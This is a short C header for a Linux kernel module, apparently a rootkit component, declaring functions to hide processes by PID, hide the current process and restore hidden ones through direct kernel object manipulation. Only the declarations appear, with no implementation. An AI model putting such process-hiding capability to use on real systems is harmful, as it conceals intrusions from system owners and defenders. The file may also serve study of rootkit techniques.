#ifndef __DKOM_H
#define __DKOM_H

#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/cred.h>

void init_dkom(void);

int hide_process_by_pid(pid_t pid);

int hide_current_process(void);

int restore_hidden_processes(void);

#endif
